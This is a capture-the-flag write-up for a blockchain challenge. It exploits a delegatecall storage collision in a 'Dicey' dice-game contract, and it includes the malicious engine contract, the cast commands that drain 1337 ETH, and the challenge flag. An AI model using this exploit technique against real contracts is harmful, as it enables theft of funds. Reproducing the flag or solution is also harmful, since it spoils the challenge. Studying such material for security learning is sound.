# dddd

| Field | Details |
|-------|---------|
| **Challenge** | dddd |
| **Platform** | themctf.com |
| **Category** | Web3 / Blockchain |
| **Flag** | `THEM?!CTF{pr0vably_fa1r_d1cey_g4m3}` |

---

## Overview

Get 1337 ETH into the player wallet. The `Dicey` contract starts with 1500 ETH inside and `isSolved()` returns `true` once `player.balance >= 1337 ether`.

---

## The Bug

`rollDice()` uses `delegatecall` on an engine address that we control:

```solidity
game.engine.delegatecall(abi.encodeWithSignature("beforeRoll(uint32)", game.nonce));
```

`delegatecall` runs the engine's code **in Dicey's storage context**. The engine address comes from `startGame()` which we supply. Deploying a malicious engine gives our code full write access to Dicey's storage.

---

## Step 1: Storage Layout Analysis

```
slot 0 → owner
slot 1 → games (mapping)
slot 2 → credits (mapping)  ← target
```

If our malicious engine mirrors this layout and `beforeRoll()` writes `credits[msg.sender] = 2000 ether`, it lands on slot 2 of Dicey's storage: overwriting the real credits balance.

---

## Step 2: Malicious Engine

```solidity
contract MaliciousEngine {
    address public owner;                        // slot 0
    mapping(address => bytes32) private _games;  // slot 1 (alignment placeholder)
    mapping(address => uint256) public credits;  // slot 2

    function beforeRoll(uint32) external payable {
        credits[msg.sender] = 2000 ether;
    }
}
```

> **Note:** The placeholder mapping on slot 1 is critical: without it the slots misalign and the write lands in the wrong place.

---

## Step 3: Exploit

```
1. deploy MaliciousEngine
2. startGame(MaliciousEngine, ...) → game.engine = our contract
3. rollDice(2) with 0.01 ETH → delegatecall fires → credits[us] = 2000 ETH
4. withdraw(1337 ether) → ETH sent to player wallet
5. isSolved() → true
```

### Commands

```bash
# deploy
forge create MaliciousEngine --rpc-url $RPC --private-key $PK --broadcast

# exploit
cast send $DICEY "startGame(address,bytes32)" $ENGINE 0x00..dead
cast send $DICEY "rollDice(uint16)" 2 --value 0.01ether
cast send $DICEY "withdraw(uint256)" 1337ether

# verify
cast call $SETUP "isSolved()(bool)"  # → true
```

---

## Flag

```
THEM?!CTF{pr0vably_fa1r_d1cey_g4m3}
```
